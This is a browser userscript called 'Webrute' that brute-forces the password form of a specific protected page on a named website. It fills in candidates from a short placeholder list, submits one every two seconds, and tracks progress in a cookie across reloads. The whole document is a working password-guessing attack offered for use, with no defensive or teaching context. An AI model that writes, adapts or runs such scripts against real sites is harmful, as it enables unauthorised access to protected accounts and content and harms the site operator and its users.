// ==UserScript==
// @name         Webrute
// @namespace    http://jason.sx
// @description  Brute-force web forms with security nonces.
// @author       J. L. Hamilton
// @match        https://www.snctm.com/lions-den/
// @grant        none
// @require http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js
// @require https://raw.githubusercontent.com/carhartl/jquery-cookie/master/src/jquery.cookie.js
// ==/UserScript==

var arr = ['password1', 'password2', 'password3'];
var cookie = $.cookie('count');
if (isNaN(cookie)) {
    $.cookie('count', 0);
    location.reload();
}

(function next(counter) {
    counter = $.cookie('count');
    if (counter < arr.length) {
        setTimeout(function () {
            $('#content-protector-access-form-lions-den input[type="password"]').val(arr[counter]);
            $("#content-protector-submit-lions-den").click();
            counter++;
            $.cookie('count', counter);
            next(counter);
        }, 2000);
    } else {
        $.removeCookie('count');
        alert('Finished');
    }
})(0);